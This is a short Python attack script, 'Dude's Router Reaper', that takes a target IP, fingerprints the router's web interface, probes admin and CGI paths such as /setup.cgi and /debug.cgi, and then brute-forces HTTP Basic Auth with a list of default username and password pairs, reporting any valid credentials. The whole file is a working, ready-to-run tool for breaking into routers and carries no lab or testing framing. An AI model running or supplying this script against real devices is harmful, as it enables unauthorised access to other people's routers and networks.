import requests
import sys

# DUDE'S ROUTER REAPER
# Targets: Web Interfaces (Port 80/443)

DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "1234"),
    ("root", "root"),
    ("root", "admin"),
    ("user", "user"),
    ("admin", ""),
    ("", "admin")
]

COMMON_PATHS = [
    "/",
    "/login.html",
    "/index.html",
    "/main.html",
    "/admin",
    "/config",
    "/setup.cgi",
    "/debug.cgi",
    "/system.cgi"
]

def scan_router(ip):
    print(f"[*] DUDE: Reaping Router at http://{ip}...")
    
    # 1. Check Server Header
    try:
        r = requests.get(f"http://{ip}", timeout=3)
        print(f"[+] DUDE: Server says: {r.headers.get('Server', 'Unknown')}")
        print(f"[+] DUDE: Title: {r.text.split('<title>')[1].split('</title>')[0] if '<title>' in r.text else 'No Title'}")
    except Exception as e:
        print(f"[-] DUDE: HTTP Connect Failed: {e}")
        return

    # 2. Check Common Paths
    print("\n[*] DUDE: Scanning paths...")
    for path in COMMON_PATHS:
        try:
            url = f"http://{ip}{path}"
            r = requests.get(url, timeout=2)
            if r.status_code == 200:
                print(f"[+] Found: {path} (200 OK)")
            elif r.status_code == 401:
                print(f"[!] Auth Required at: {path}")
        except:
            pass

    # 3. Basic Brute Force (Basic Auth)
    print("\n[*] DUDE: Attempting Default Creds (Basic Auth)...")
    for user, pwd in DEFAULT_CREDS:
        try:
            r = requests.get(f"http://{ip}", auth=(user, pwd), timeout=2)
            if r.status_code == 200:
                print(f"[!!!] DUDE SUCCESS: Creds Valid! {user}:{pwd}")
                return
        except:
            pass
            
    print("[-] DUDE: Brute force finished.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 dude_router_reaper.py <ip>")
    else:
        scan_router(sys.argv[1])
